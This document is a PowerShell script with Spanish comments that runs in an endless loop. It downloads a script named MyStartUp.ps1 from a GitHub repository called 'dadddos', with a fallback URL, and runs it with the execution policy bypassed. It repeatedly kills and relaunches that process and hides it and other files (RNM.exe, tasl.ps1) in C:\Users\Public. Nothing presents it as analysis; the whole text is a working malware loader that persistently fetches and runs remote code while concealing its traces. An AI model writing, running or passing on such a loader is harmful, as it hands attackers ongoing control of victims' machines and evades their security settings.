$downloadUrl = "https://raw.githubusercontent.com/fullcaletaxixth/dadddos/main/MyStartUp.ps1"
$down = "https://raw.githubusercontent.com/fullcaletaxixtdos/dadddos/main/MyStartUp.ps1"


$filePath = "C:\Users\Public\MyStartUp.ps1"
$verifyInterval = 290


$previousPID = $null

while ($true) {
    if (Test-Path -Path $filePath) {
        $process = Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$filePath`"" -PassThru
        $previousPID = $process.Id
    }

    Start-Sleep 5.6
    # Terminar el proceso anterior si existe   
    if ($previousPID -ne $null -and (Get-Process -Id $previousPID -ErrorAction SilentlyContinue)) {
        Stop-Process -Id $previousPID -Force
	Start-Sleep 9.6
    }
  
    # Eliminar el archivo si existe
    if (Test-Path -Path $filePath) {
        Remove-Item -Path $filePath -Force
    }
    
    if ((Get-Date).Hour -eq 01) { 
    Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath
    } else {
    Start-Sleep 4.4
    Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath  
    } 

    if (-not (Test-Path "C:\Users\Public\MyStartUp.ps1")) {
    Start-Sleep 5
    Invoke-WebRequest -Uri $down -OutFile $filePath
    }
    
    Start-Sleep 8.8
   
    if (Test-Path -Path $filePath) {
        $process = Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$filePath`"" -PassThru
        $previousPID = $process.Id
    }
	attrib +h C:\Users\Public\MainWinStyle.ps1
	attrib +h C:\Users\Public\MyStartUp.ps1
	attrib +h C:\Users\Public\RNM.exe
 	attrib +h C:\Users\Public\tasl.ps1
  	
    Start-Sleep -Seconds $verifyInterval


    if ($previousPID -ne $null -and (Get-Process -Id $previousPID -ErrorAction SilentlyContinue)) {
        Stop-Process -Id $previousPID -Force
	Start-Sleep 9.6
    }
}
